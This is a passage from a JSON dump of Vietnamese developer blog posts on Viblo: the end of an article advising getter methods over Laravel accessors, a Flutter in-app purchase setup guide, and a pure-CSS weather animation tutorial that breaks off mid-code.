nên thường viết kèm với nhau. Nếu chưa có khái niệm gì về accessor và mutator, thì bạn có thể tham khảo thêm tại bài viết này[ Laravel Accessor và Mutator](https://viblo.asia/p/laravel-accessors-and-mutators-AQrMJbOzM40E)\n- Hiêu nôm na accessor sẽ thông qua một ví dụ đơn giản như sau. Một User có 2 trường `last_name` và `first_name` và tôi muốn hiển thị `full_name` của 1 user. Như vậy, nếu không sử dụng accessor trên file .blade chúng ta có thể sử dụng như sau:\n```blade\n{{$user->first_name . $user->last_name}}\n```\nNếu sử dụng accessor thì chúng ta cần thực hiện ở model user như sau:\n```php\nnamespace Models;\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass User extend Model\n{\n        protected $fillable = ['first_name', 'last_name'];\n        protected $appends = ['full_name];\n        protected getFullNameAttribute()\n       {\n            return $this->fist_name . $this->last_name;\n       }\n}\n```\nNhư vậy trên .blade chúng ta có thể sử dụng như sau:\n```blade\n{{ $user->full_name }}\n```\n### Những vấn đề của Accessor\n#### Vấn đề 1: Trường `full_name` này là trường gì? \n- Với những người mới, hay những người chưa quen thuộc với Laravel, hoặc chưa từng sử dụng accessor (mặc dù có thể họ đã đọc trên document nhưng chưa dùng đến nên quên mất), thì suy nghĩ ban đầu là trường full_name này là một cột trong bảng user trong database.  Đây là một suy nghĩ ban đầu thường được nghĩ đến đầu tiên. Nhưng khi kiểm tra trong database, lại không có cột này trong database. Họ sẽ không thể nhanh chóng đoán được đoạn code này liên quan đến accessor trong model. Nếu có lỗi xảy ra, họ sẽ có thể mất hàng giờ để tìm ra, rốt cục giá trị trường `full_name` được lấy ra ở đâu. Vì `full_name` sẽ được hiểu là một \"magic\" nào đó, và có khi, họ còn không còn tìm được, và không thể hiểu được tại sao lại có một `user` lại có giá trị `full_name`.  Ngay cả bây giờ, đôi khi đọc code, nếu không nhớ ra accessor, thì tôi vẫn phải cặm cụi debug từng dòng để hiểu dòng, logic của đoạn code đang lỗi. Với một dự án lớn, thì sẽ rất khó để hiểu toàn bộ dự án, bạn sẽ chỉ có khả năng hiểu một phần, và đến khi có lỗi xảy ra ở phần bạn chưa biết, thì cách duy nhất để fix lỗi đó là bạn lại phải debug từng dòng để hiểu đoạn code này làm gì, tại sao lại viết như vậy, ý tưởng của nó là gì. Không phải có thể nhanh chóng phát hiện \"chỗ nào có khả năng lỗi nhất\" trong khi bạn không thể nắm được chính xác các luồng xử lý bên trong. \n### Vấn đề 2: Có khả năng ẩn bug nếu trong accessor xử lý quá nhiều logic.\n- Việc này có thể xảy ra trong trường hợp accessor có một lượng xử lý logic lớn, và chính những xử lý đó tiềm ẩn những bug  mà khó thể phát hiện ra. \n- Khi thực hiện việc xử lý logic trong accessor, nó cũng có nguy cơ như những xử lý logic thông thường khác, logic càng phức tạp, càng khó hiểu, thì nó sẽ càng có nguy cơ có bug cao. Việc viết logic trong accessor tôi không khuyến khích, tuy nhiên, thực tế, để cho \"tiện\" hoặc đỡ mất effort, thì đôi khi chúng ta lại nhắm bắt làm bừa. \n- Như đã đề cập ở trên, việc tìm ra lỗi do accessor đã là một thời gian khá lâu rồi, thì việc code logic trong accessor phức tạp sẽ dẫn đến việc đọc hiểu sẽ mất nhiều thời gian hơn nhiều so với những gì mà người tạo ra accessor có thể ngờ đến. Nó lại không mang lại khả năng \"đọc/hiểu (readable)\" của code như kỳ vọng mà lại hoàn toàn ngược lại. Như vậy, khi sử dụng accessor, chúng ta cần cân nhắc vấn đề này, chỉ nên sử dụng những logic đơn giản.\n### Vấn đề 3: N+1 query\n- Vấn đề này chưa được đề cập ở bài viết gốc, tuy nhiên, vấn đề này thực tế tôi gặp rồi, và cũng là vấn đề khá nhức nhối, nên tôi quyết định viết thêm vào. \n- Bài toán đặt ra là thêm một thuộc tính **status** mỗi khi lấy thông tin của 1 $user, mà thông tin status này được lấy từ một bảng khác, thông qua relationship. Nếu không sử dụng accessor, thì chúng ta có thể sử dụng **with** khi query trong Eloquent query rồi sau đó sử lý logic. Tuy nhiên, đôi khi junior lại có suy nghĩ, tại sao lại không thêm **status** như một accessor, một thuộc tính của mỗi user, khi lấy user ra thì nó đã có **status** rồi. Đó là suy nghĩ không sai, nhưng thực tế, nó sẽ gây ra vấn đề n+1 query. Tại mỗi lần lấy thông tin một $user, nó sẽ mặc định query để lấy thông tin **status** chèn vào mỗi lần trả về giá trị của 1 $user. Số lượng câu query sẽ tăng lên nhiều ít phụ thuộc vào cách lấy **status** và độ phức tạp khi lấy **status**. Tuy nhiên số lượng câu query trong database có thể sẽ tăng mạnh. Điều này cũng không dễ nhận biết tại sao lại có số câu query tăng lên nhiều như vậy trong quá trình refactor, performance.\n### Giải pháp \n- Giải pháp được đưa ra là **Hãy sử dụng và chỉ sử dụng Getter method**. \n- Thay vì việc sử dụng accessor như trên và sử dụng *{{ $user->full_name}}* hãy sử dụng **{{$user->getFullName()}}**.\n- Việc sử dụng getter, thì bản thân sẽ hiểu được đó là một method trong model, và cụ thể hơn nó có khả năng \"clickable\" trên các IDE ví dụ như phpStorm. (click vào nó sẽ nhảy đến chỗ cài đặt phương thức), điều này sẽ giảm bớt thời gian tìm hiểu hơn.  \n### Tóm lại\n- Khi sử dụng accessor chúng ta cần chú ý một số tip như sau:\n  + Chỉ sử dụng accessor với những logic đơn giản \n  + Không nên query dữ liêu của accessor sang bảng khác, vì sớm hay muộn nó cũng gây ra vấn đề hiệu năng (performance)\n  + Hãy cố gắng sử dụng các **Getter** method thay vì accessor",
        "published_at": "2020-02-12 13:10:34",
        "is_published": true,
        "updated_at": "2020-02-12 21:46:00",
        "translation_source": null,
        "trend_at": null,
        "promoted_at": null,
        "reading_time": 9,
        "points": 2,
        "views_count": 62,
        "clips_count": 0,
        "comments_count": 0,
        "rated_value": null,
        "promoted": false,
        "trending": false,
        "is_draft": false,
        "is_public": true,
        "locale_code": "vi",
        "is_video": false,
        "thumbnail_url": null,
        "user": {
            "data": {
                "id": 260,
                "url": "https://viblo.asia/u/tran.van.nhat",
                "avatar": "9f350d37-bd13-48ee-928a-3b5d1262feb5.jpg",
                "name": "Tran Van Nhat",
                "username": "tran.van.nhat",
                "followers_count": 16,
                "reputation": 465,
                "posts_count": 52,
                "banned_at": null,
                "following": false
            }
        },
        "tags": {
            "data": [
                {
                    "slug": "accessor",
                    "name": "accessor",
                    "primary": false,
                    "image": "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=accessor&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "php",
                    "name": "PHP",
                    "primary": false,
                    "image": "https://placehold.jp/16/16a085/ffffff/80x80.jpg?text=PHP&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "laravel",
                    "name": "Laravel",
                    "primary": false,
                    "image": "https://placehold.jp/16/16a085/ffffff/80x80.jpg?text=Laravel&css=%7B%22padding%22%3A%223px%22%7D"
                }
            ]
        },
        "commentators": {
            "data": []
        }
    },
    {
        "id": 38413,
        "title": "[In App Purchase Flutter] Phần 1: Thiết lập các cấu hình cơ bản cho project",
        "slug": "ORNZqxrqK0n",
        "url": "https://viblo.asia/p/in-app-purchase-flutter-phan-1-thiet-lap-cac-cau-hinh-co-ban-cho-project-ORNZqxrqK0n",
        "user_id": 40256,
        "moderation": null,
        "transliterated": "in-app-purchase-flutter-phan-1-thiet-lap-cac-cau-hinh-co-ban-cho-project",
        "contents_short": "Ngày nay chúng ta dễ dàng bắt gặp những ứng dụng free kiếm tiền bằng cách bán các gói nâng cấp tài khoản để gỡ bỏ hiển thị quảng cáo trong app, hoặc để unblock một số tính năng giới hạn, mua bán cá...",
        "contents": "Ngày nay chúng ta dễ dàng bắt gặp những ứng dụng free kiếm tiền bằng cách bán các gói nâng cấp tài khoản để gỡ bỏ hiển thị quảng cáo trong app, hoặc để unblock một số tính năng giới hạn, mua bán các Diamond, Gem (trong Game),... Vì vậy, để tạo sự tiện lợi, nhanh chóng, tin cậy, bảo mật cho người dùng, Apple và Google Store đã tạo ra hệ thống trung gian mua bán các sản phẩm trên các ứng dụng mà mình quản lý và kiểm soát. Mặt khác, việc làm bên thứ 3 trung gian khiến cho dòng tiền từ người dùng đến người bán luôn bị chiết khấu theo % nhất định, rõ ràng là số tiền không hề nhỏ và Apple, Google không muốn bỏ qua dòng tiền này rồi :v.\n\n### 1. Các dạng Product trên Store:\n\nApple cung cấp cho Developer 1 API gọi là In-App Purchase, còn bên Google Store gọi là In-App Billing để đa dạng hoá hệ thống mua bán sản phẩm và dịch vụ. Có 4 dạng sản phẩm:\n\n- **Consumable**: Người dùng có thể mua 1 hoặc nhiều lần, không giới hạn thời gian. Ví dụ: mua Diamond, Gem, lượt chơi hay mua thêm lượt để tiếp tục chơi game, v.v\n- **Non-Consumable**:  Người dùng mua 1 lần và sử dụng mãi mãi. Ví dụ: các sticker trong ứng dụng chat, các vòng chơi bí mật trong Game, v.v \n- **Subscription**: Người dùng có thể mua và sử dụng trong khoảng thời gian cố định, đặc biệt tự động gia hạn khi hết hạn nếu người dùng không huỷ gói đã mua. Ví dụ: gói phim của Netflix, Elsa, v.v\n- **Non-Renewing Subscription**:  Giống y hệt Subscription nhưng không tự động gia hạn khi hết hạn.\n\nVới 4 loại trên có lẽ chúng ta có đầy đủ các phương thức để thiết lập thanh toán cho ứng dụng của mình, giờ bắt đầu vào thiết lập cho từng hệ điều hành thôi.\n\n### 2. Setup Ios: \n\nĐầu tiên truy cập trang [Apple Connect User](https://appstoreconnect.apple.com/login).\n\n**1. Set up Bank Account**:\n\nBạn cần phải cung cấp đầy đủ thông tin từ tài khoản ngân hàng, thuế, thanh toán và đồng ý các điều khoản với Apple. Xem chi tiết tại [đây](https://help.apple.com/app-store-connect/#/devb6df5ee51)\n\nSau khi truy cập trang Apple Connect User, bạn chọn tiếp **Agreements, tax, and banking** (biểu tượng ở dưới)\n\n![](https://images.viblo.asia/580ac5e9-a1a6-4918-9240-474e7e729999.png)\n\n**Lưu ý**: Sau khi bạn điền đầy đủ thông tin và được Apple review xong mới có thể fetch danh sách sản phẩm trên Store xuống ứng dụng được.\n\n**2. Enable IAP Capability in XCode**:\n\n![](https://images.viblo.asia/2903f754-d692-444f-bee6-2ce737c7b314.png)\n\n### 3. Setup Android:\nPlay Store [Billing](https://developer.android.com/google/play/billing/billing_overview) sẽ không hoạt động cho đến khi bạn update 1 bản release Alpha track.\n\n![](https://images.viblo.asia/e6a6bcdf-db01-4921-b71c-d3e3fd04c8f3.png)\n\nXin quyền trong file **AndroidManifest.xml**\n```\n<uses-permission android:name=\"com.android.vending.BILLING\" />\n```\n\n### 4. Setup Flutter:\nThêm plugin vào dependencies trong file **pubspec.yaml** của bạn:\n\n![](https://images.viblo.asia/3602c326-ca1e-4c88-a0a7-a934d0f7a315.png)\n\nVậy là xong phần thiết lập rồi, các bạn hãy đón chờ phần tiếp theo mình sẽ đi sâu vào phần code nhé!",
        "published_at": "2020-02-12 11:53:19",
        "is_published": true,
        "updated_at": "2020-02-12 21:41:01",
        "translation_source": null,
        "trend_at": null,
        "promoted_at": null,
        "reading_time": 3,
        "points": 1,
        "views_count": 34,
        "clips_count": 0,
        "comments_count": 0,
        "rated_value": null,
        "promoted": false,
        "trending": false,
        "is_draft": false,
        "is_public": true,
        "locale_code": "vi",
        "is_video": false,
        "thumbnail_url": "https://images.viblo.asia/580ac5e9-a1a6-4918-9240-474e7e729999.png",
        "user": {
            "data": {
                "id": 40256,
                "url": "https://viblo.asia/u/core200lab",
                "avatar": "6e49b922-c150-443f-b549-ae4bc34ff1f4.jpg",
                "name": "Technology solution for startup",
                "username": "core200lab",
                "followers_count": 5,
                "reputation": 57,
                "posts_count": 3,
                "banned_at": null,
                "following": false
            }
        },
        "tags": {
            "data": [
                {
                    "slug": "solution-for-startup",
                    "name": "solution for startup",
                    "primary": false,
                    "image": "https://placehold.jp/16/d35400/ffffff/80x80.jpg?text=solution+for+startup&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "google-play-billing",
                    "name": "Google Play Billing",
                    "primary": false,
                    "image": "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=Google+Play+Billing&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "flutter",
                    "name": "Flutter",
                    "primary": false,
                    "image": "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=Flutter&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "ios-payment",
                    "name": "IOS payment",
                    "primary": false,
                    "image": "https://placehold.jp/16/d35400/ffffff/80x80.jpg?text=IOS+payment&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "200lab",
                    "name": "200lab",
                    "primary": false,
                    "image": "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=200lab&css=%7B%22padding%22%3A%223px%22%7D"
                }
            ]
        },
        "commentators": {
            "data": []
        }
    },
    {
        "id": 38395,
        "title": "Tập tành tìm hiểu CSS: Thực hành: Hiệu ứng thời tiết",
        "slug": "3P0lPn7GKox",
        "url": "https://viblo.asia/p/tap-tanh-tim-hieu-css-thuc-hanh-hieu-ung-thoi-tiet-3P0lPn7GKox",
        "user_id": 18003,
        "moderation": null,
        "transliterated": "tap-tanh-tim-hieu-css-thuc-hanh-hieu-ung-thoi-tiet",
        "contents_short": "Vài lời\nQua 3 bài trước trong series, mình đã hướng dẫn mọi người tìm hiểu về các yếu tố cơ bản trong css animation. Tất nhiên là vẫn còn nhiều thứ khác để khiến cho trình css của bạn \"Awesome\" hơn...",
        "contents": "# Vài lời\nQua 3 bài trước trong series, mình đã hướng dẫn mọi người tìm hiểu về các yếu tố cơ bản trong css animation. Tất nhiên là vẫn còn nhiều thứ khác để khiến cho trình css của bạn \"Awesome\" hơn, ví dụ như hiệu ứng với cube chẳng hạn :D. Tuy nhiên là với sự tìm hiểu của mình thì chưa đến tầm \"ngấm\" được đám hiệu ứng 3D đó (1 số cái còn phải làm toán tích phân để tính góc ấy (sohai4)). Vì vậy, sau 3 bài mình chọn viết 1 bài thực hành áp dụng những gì đã học làm 1 vài hiệu ứng vui vui cho website :D\n\nHiện tại mình đang làm cái Chrome starting page cho mình (chỉ vì tìm được cái hình ảnh đẹp :D), nên mình chọn làm hiệu ứng thời tiết cho cái tranh phong cảnh của starting page của mình. Và tất nhiên, như tiêu chí ban đầu của mình: Just pure CSS\n# Hiệu ứng mưa rơi\n![](https://images.viblo.asia/9257f25b-fe31-4259-9970-36ead2adc13a.gif)\n\n1 trong những hiệu ứng thời tiết phổ biến nhất chắc là mưa rơi rồi :D. Trên mạng thì nhiều hướng dẫn mưa rơi với js lắm, nhưng tất nhiên là mình sẽ không sử dụng js rồi\n## Tạo các hạt mưa\nĐầu tiên, tất nhiên ta phải tạo hạt mưa rơi rồi: Ở đây mình sử dụng màu trắng cho hạt mưa, do hạt mưa đang rơi, nên mình cho hạt mưa chuyển sắc từ transparent tới trắng theo chiều từ trên xuống nữa. Và để tạo cảm giác mưa rơi, \"hạt\" mưa này sẽ có chiều dài 100px, và để nó \"visible\", nhớ cho nó bề rộng 1px nhé (hạt nên bé thôi, đừng ai cho hạt mưa đá siêu to khổng lồ nhé, vỡ đầu mất :D). \nTất nhiên 1 cơn mưa không thể chỉ có 1 hạt mưa. Giờ cần nhân lên nhiều hạt mưa nữa. Và các hạt mưa thì có thể có chiều dài khác nhau, nên mình tạo vài \"lớp\" mưa với mỗi lớp có chiều dài hạt mưa khác nhau.  Cơn mưa lớn hay nhỏ sẽ tùy thuộc vào số lớp và số hạt mưa bạn tạo nên:\n```html:index.html\n<body>\n    <div class=\"layer-1\">\n        <div class=\"rain-drop\"></div>\n        <div class=\"rain-drop\"></div>\n        <div class=\"rain-drop\"></div>\n        <div class=\"rain-drop\"></div>\n        <div class=\"rain-drop\"></div>\n    </div>\n    <div class=\"layer-2\">\n        <div class=\"rain-drop\"></div>\n        <div class=\"rain-drop\"></div>\n        <div class=\"rain-drop\"></div>\n        <div class=\"rain-drop\"></div>\n        <div class=\"rain-drop\"></div>\n    </div>\n</body>\n```\n```css:style.css\n.rain-drop {\n    width: 1px;\n    background-image: linear-gradient(to bottom, transparent, white); /* màu chuyển sắc từ trong suốt tới trắng*/\n}\n.layer-1 .rain-drop {\n    height: 100px;\n}\n.layer-2 .rain-drop {\n    height: 50px;\n}\n```\n\n## Chọn chỗ mưa rơi\nHiện tại, nếu xem trên màn hình bạn sẽ thấy mấy hạt mưa đang xếp theo chiều dọc, và để đảm bảo các hạt mưa này luôn rơi trên màn hình như mong muốn mà không bị ảnh hưởng bởi các div khác, mình cho `position: fixed`. Nhưng mà giờ thì đám mưa đang \"chồng\" lên nhau. Vậy nên cần vứt mỗi thằng 1 chỗ rải rác trên màn hình đã (để lấy ví dụ thì mình sử dụng 1 layer thôi):\n```css:style.css\n.rain-drop:nth-child(2) {\n  left: 10%; /* sử dụng % là để tiện responsive nhé */\n}\n.rain-drop:nth-child(3) {\n  left: 80%\n}\n.rain-drop:nth-child(4) {\n  left: 35%\n}\n.rain-drop:nth-child(5) {\n  left: 65%\n}\n...\n```\n![](https://images.viblo.asia/6605201e-97bb-4564-ac70-75b0c8d5919c.png)\n\nVậy là xong phần vẽ mấy hạt mưa với vứt lung tung trên màn hình. Giờ để vứt lên \"mây\" và thả mưa rơi xuống, sẽ cần tạo keyframes mưa rơi: ban đầu hạt mưa sẽ ở trên \"mây\" (tức là cao hơn màn hình: hạt mưa dài 100px thì mình cho vị trí ban đầu của nó là: `top: -100px`); sau khi mưa rơi tới hết màn hình, thì vị trí hạt mưa sau rơi sẽ là vị trí hết chiều dài màn hình: `top: 100vh;` (vh là view height: chiều dài view)\n## Cho mưa rơi\n```css:style.css\n@keyframes rainFall {\n  0% {\n    top: -100px;\n  }\n  50% { /* cái 50% này là optional, mình muốn hạt mưa rơi xuống hết xong chờ 1 chút rồi mới lại rơi lần nữa, có thể là 50% hoặc bao nhiêu % tùy thuộc vào bạn muốn đỗ trễ  là bao nhiêu */\n    top: 100vh;\n  }\n  100% {\n    top: 100vh;\n  }\n}\n```\nGiờ chỉ cần thêm keyframes `rainFall` này vào các hạt mưa là ổn. Để mỗi hạt mưa có thời gian rơi khác nhau, hãy chỉnh các tham số delay và duration cho mỗi hạt khác nhau nhé\n```css\n  animation: rainFall .8s linear 2s infinite;\n  /* thứ tự các tham số: [tên hiệu ứng] [duration] [timing function] [delay time] [iteration-count]  */\n```\nNếu lỡ không nhớ mấy cái tham số kia thì mở bài này xem nhá: [Bài 3: Keyframes & Animation](https://viblo.asia/p/tap-tanh-tim-hieu-css-animation-bai-3-keyframes-animation-3Q75w86BKWb)\n\nVới duration, bạn sẽ quyết định tốc độ rơi của mưa, thêm vào đó là đỗ trễ ở trong key frames nữa (cái mình ghi optional ấy), 2 điều này cùng với độ \"dày\" các hạt mưa bạn tạo sẽ quyết định độ lớn nhỏ của cơn mưa, mưa nhỏ hay mưa bão. Nếu định làm bão với mưa rơi nghiêng, thì hãy thêm thuộc tính `left/right: ?vw` để tạo độ nghiêng cho mưa rơi nhé: vd:\n```css\n@keyframes storm {\n  0% {\n    top: -100px;\n  }\n  100% {\n    top: 100vh;\n    left: 20vw; /*vw: view width */\n  }\n}\n```\nMọi người có thể tham khảo thành quả tại đây nhé: https://codepen.io/bunnypi04/pen/JjddZYK\n{@embed: https://codepen.io/bunnypi04/pen/JjddZYK}\n# Hiệu ứng hoa tuyết rơi\nHiệu ứng này mình sẽ làm vài bông tuyết xinh xinh rơi lờ đờ, các bạn cũng có thể dùng hình tròn trắng cơ bản xong blur ra cũng được nhé, chứ mình thì thích đẹp :D\n``` \nHoa tuyết 1:  ❅\nHoa tuyết 2:  ❆\n```\n## Tạo các bông hoa tuyết\nTương tự như các hạt mưa rơi, tạo vài bông tuyết chờ được rơi nhé:\n```html:fileHTML\n  <div class=\"snowflake\">  ❅  </div>\n  <div class=\"snowflake\">  ❆  </div>\n  <div class=\"snowflake\">  ❅  </div>\n  <div class=\"snowflake\">  ❆  </div>\n...\n```\nMật độ bông tuyết tất nhiên là tùy bạn muốn tuyết rơi nhiều hay ít thôi, cứ thêm vào cho đến khi thấy đủ nhé :D\n\nHoa tuyết nên mình muốn để nó màu trắng, tất nhiên là trong 1 số trường hợp nó màu xanh nhạt, hoặc bạn muốn nó màu đỏ thì cũng là tùy bạn nhé :D. Vì ở đây sử dụng text symbol, nên để chỉnh kích cỡ hoa tuyết chỉ cần thay đổi font-size là được. Nếu nền trắng như tuyết thì nhớ thêm shadow cho bông tuyết nếu không lại \"trắng quá nhìn không ra\" nhé:\n```css:fileCss\n.snowflake {\n  color: #fff;\n  font-size: 1em;\n  font-family: Arial, sans-serif;\n  text-shadow: 0 0 5px #000;\n/* Để  tuyết luôn rơi trên màn hình và không bị ảnh hưởng, set position fixed*/\n  position: fixed;\n  z-index: 999; /* cho chắc =)) */\n/* tuyết cần rơi từ điểm bắt đầu nằm trên cái màn hình */\n  top: -10%;\n}\n```\n## Chọn vị trí tuyết bắt đầu rơi\n\nNhư hiệu ứng mưa rơi ở trên, mình sẽ random các vị trí bắt đầu cho các bông tuyết bằng thuộc tính `left: x%;`\n```css:fileCSS\n.snowflake:nth-of-type(0) {\n  left: 1%;\n}\n.snowflake:nth-of-type(1) {\n  left: 10%;\n}\n.snowflake:nth-of-type(2) {\n  left: 20%;\n}\n...\n```\n## Rơi nào\nTương tự như mưa rơi, mình sẽ làm keyframes `snowFall` với điểm bắt đầu là trên cùng và kết thúc là chạy hết màn hình:\n```css\n@keyframes snowflakes-fall {\n  0% {\n    top: -10%\n  }\n  100% {\n    top: 100%\n  }\n}\n```\n\nTuy nhiên nếu chỉ như thế thì chưa đẹp. Cho bông tuyết \"đu đưa\", \"lạng lách\" trên đường rơi xuống trông cho giống thật nữa. Ở đây mình sẽ chọn cách \"đu đưa\" đơn giản thôi, đấy là lượn sang bên phải, xong lại lượn về \n```css\n@keyframes snowflakes-shake {\n  0%, 100% {\n    transform: translateX(0);\n  }\n  50% {\n    transform: translateX(80px);\n  }\n}\n```\nVậy là xong keyframes. Giờ cần add keyframes vào cho các bông tuyết nữa là xong. Vì add tận 2 hiệu ứng, nên mình sẽ viết tường minh ra cho dễ customize, không viết short syntax nữa:\n```css\n.snowflake {\n  animation-name: snowflakes-fall, snowflakes-shake; /* Sử dụng 2 hiệu ứng(Keyframes): kf_1, kf_2 */\n  animation-duration: 10s, 3s; /* duration tương ứng cho 2 hiệu ứng */\n  animation-timing-function: linear, ease-in-out; /* timing function tương ứng */\n  animation-iteration-count: infinite, infinite; /* lặp lại vô hạn hiệu ứng, để tuyết không ngừng rơi :v */\n  animation-play-state: running, running; /* cái này là để cho nó chạy thôi */\n}\n```\n\nHiện tại thì các bông tuyết đang rơi cùng lúc, chỉ cần chỉnh thời gian delay random cho từng bông tuyết nữa là xong:\n```css\n.snowflake:nth-of-type(0) {\n  animation-delay: 0s, 0s /* độ trễ tương ứng với kf_1, kf_2 */\n}\n.snowflake:nth-of-type(1) {\n  animation-delay: 1s, 1s\n}\n.snowflake:nth-of-type(2) {\n  animation-delay: 6s, .5s\n}\n.snowflake:nth-of-type(3) {\n  animation-delay: 4s, 2s\n}\n```\n\nVậy là xong tuyết rơi rồi, các bạn có thể tham khảo tại đây nhé: https://codepen.io/bunnypi04/pen/ZEGGxey\n\nHiệu ứng tuyết rơi được tham khảo và lược từ https://pajasevi.github.io/CSSnowflakes/\n\nTương tự như trên, custom lại 1 chút bạn có thể tạo ra hiệu ứng gió (lá bay loạn xạ), hoa bay,...\n# Hiệu ứng sương bay (mây bay)\nVới hiệu ứng sương và mây, khác nhau đôi chút ở độ hiển thị (opacity) và độ đặc của khối mây. Về cơ bản, mình sẽ tạo các khối elip bay lơ lửng và khiến nó \"mờ ảo\" để tạo các đám sương.\n```html:TạoKhốiSương\n<div class=\"fog\"></div>\n<style>\n    .fog {\n        position: fixed;\n        width: 40vw;\n        height: 5vw;\n        bottom: 5vw;\n        left: 10vw;\n        border-radius: 50%;\n        background-color: white; /* mình tạo sương/mây trắng thôi, cứ coi như là không ô nhiễm xám xịt nhé =)) */\n    }\n</style>\n```\nGiờ bạn sẽ thấy 1 khối elip trắng lơ lửng ở giữa màn hình. Chưa giống sương lắm nhờ. Mình sẽ làm nó tản ra bằng cách thêm filter `blur`. Bạn nào hay dùng photoshop hoặc app chỉnh ảnh là quen với cái này lắm này :D\n```css\n.fog {\n    filter: blur(40px);\n}\n```\nGiờ dựa vào kết quả trên màn hình, hãy chỉnh độ `blur` để đạt được độ mờ sương - hoặc dày như mây như mong muốn. Chỉ số càng cao, thì độ \"tán\" càng nhiều, trông sẽ càng mờ giống đám sương. Ngược lại, độ `blur` càng thấp, hình elip sẽ càng sắc nét và càng giống... hình elip :D.\n\nĐể cho giống sương mỏng hơn, thì có thể thêm vào `opacity` nhỏ để tăng độ trong suốt:\n```css\n.fog {\n    opacity: 0.5;\n}\n```\n![](https://images.viblo.asia/9598d1dc-ca12-48f0-8048-4ca1152c49da.png)\n\nGiờ tạo thêm vài đám nữa bay lơ lửng là giống Sa Pa rồi đấy, còn để giống Hà Nội thì mây với sương màu xám tí là giống nhé :D\n\n# Hiệu ứng sấm chớp\nNốt cái này cho đủ bộ thời tiết :D. Để làm sấm chớp cho giống thật, thì sẽ cần 1 tia chớp, không dùng thì mình tạo màn chớp thôi cũng không sao cả.\n\nỞ đây hiệu ứng là cứ sau vài giây thì bầu trời lóe sáng, kèm theo là 1 tia chớp hiện lên, sau đó tất cả vụt tắt đi. Vậy mình sẽ tạo 1 màn đi kèm ngay sau màn background của screen, và sử dụng 1 hình ảnh tia chớp mà mình kiếm được\n```html\n<body>\n    <div class=\"lightning\">\n        <img src=\"http://www.pngmart.com/files/11/Lightning-PNG-Transparent-Picture.png\">\n    </div>\n</body>\n<style>\n.lightning {\n  position: absolute;\n  right: -50%;\n  background: white; /* màn chớp của mình chọn màu trắng */\n  animation: lightning 4s linear infinite; /* đặt tên hiệu ứng là lightning luôn, và cho chạy 4s loop */\n}\n.lightning img {\n  width: 75%;\n  transform: scaleX(-1) rotate(45deg); /* do cái ảnh nó chưa có độ nghiêng như mình muốn nên mình flip và nghiêng lại cho đẹp */\n}\n</style>\n```\nDo đã chọn màn chớp trắng, và chọn màn chớp hiện cùng với tia chớp, nên mình chọn luôn màn màu trắng và để nó animate cùng tia chớp. Nếu muốn màn chớp vài cái mới có tia chớp thì chỉ cần tạo thêm 1 layer nữa cho màn chớp riêng thôi nhé.\n\nGiờ tới lúc tạo hiệu ứng là xong:\n```css\n    @keyframes lightning {\n        0%, 100% {\n            opacity: 0;\n        }\n        30% {\n            opacity: 0; /* từ 0->30% thì nền vẫn như bình thường */\n        }\n        32% {\n            opacity: 1; /* trong từ 30-32% thì hiện lên chớp, thời gian nhanh thì nó sẽ lóe lên nhanh */\n        }\n        37% {\n            opacity: 0; /* từ 32-35% thì chớp tắt đi, mình để tắt đi lâu hơn 1 tí tạo hiệu ứng dư âm */\n        }\n    }\n```\nDemo tại đây nhé: https://codepen.io/bunnypi04/pen/wvaKzre\n{@embed: https://codepen.io/bunnypi04/pen/wvaKzre}\n\n# Làm mặt trời mọc - lặn\nViệc mọc lặn của mặt trời này chỉ là khiến mặt trời di chuyển trên 1 đường tròn mà thôi.\n### Trước hết tạo 1 mặt trời đã\n```html\n<div class=\"sun\"></div>\n<style>\n.sun {\n    width: 10vw;\n    height: 10vw; /* chiều cao bằng chiều rộng = 10 view width */\n    background-color: #fde477;\n    border-radius: 50%;\n    position: absolute;\n    top: 50%;\n    left: 50%;\n}\n</style>\n```\nỞ đây mình để mặt trời nằm tại trung tâm luôn\n### Sử dụng `translateX()` để xác định bán kính đường tròn\nĐể xoay mặt trời theo đường tròn, cần phải xác định bán kính cho đường tròn. Lấy điểm tâm của đường tròn chính là vị trí mà vừa đặt mặt trời vào (điểm top: 50%; bottom: 50%), giờ phải dịch mặt trời ra rìa đường tròn (cách tâm 150px)\n\n![](https://images.viblo.asia/0445ffe5-70f1-48fa-bdbc-04347dcd40bb.png)\n\n```css\n.sun {\n    transform: translateX(150px);\n}\n```\n### Thêm `rotate()` để cho mặt trời chạy quanh đường tròn\nNếu chúng ta thêm `rotate()` vào  `transform`, và phía trước `translateX` ở trên, mặt trời sẽ được xoat quanh tâm với bán kính của `translateX`. Để dễ nhìn sự di chuyển, hãy thử cho 1 góc 45 độ trước:\n\n![](https://images.viblo.asia/94cb0661-a17e-4a16-9072-f1bf8287b2e6.png)\n```css\n.sun {\n    transform: rotate(45deg) translateX(150px);\n}\n```\n\nVấn đề ở đây là cái mặt trời nó bị nghiêng rồi! Hãy tưởng tượng trường hợp này giống như bạn đi bộ quanh trái đất ấy. cho dù bạn đứng ở đâu trên đường tròn trái đất, thì chân vẫn hướng về tâm trái đất, và đầu thì hướng vuông góc mặt đất.\n\nNhưng mà cái mặt cười kia không muốn nó xoay thế kia thì làm thế nào?\n\nTheo như hình vẽ có thể thấy, khi quay quanh tâm 45 độ thì vật thể cũng quay 45 độ. Vậy muốn nó trông y như hình dạng ban đầu thì chỉ cần xoay ngược lại là xong!\n```css\n.sun {\n    transform: rotate(45deg) translateX(150px) rotate(-45deg);\n}\n```\nVậy là đã xử lý được vụ xoay. Giờ thì apply animation thôi:\n\n```html\n<div class=\"sun\"></div>\n<style>\n.sun {\n    width: 10vw;\n    height: 10vw; /* chiều cao bằng chiều rộng = 10 view width */\n    background-color: #fde477;\n    border-radius: 50%;\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    animation: rise 5s infinite; /*cho nó xoay cả ngày luôn */\n}\n@keyframes rise {\n  from {\n    transform: rotate(0) translateX(-150px) rotate(0);\n  }\n  to {\n    transform: rotate(360deg) translateX(-150px) rotate(-360deg);\n  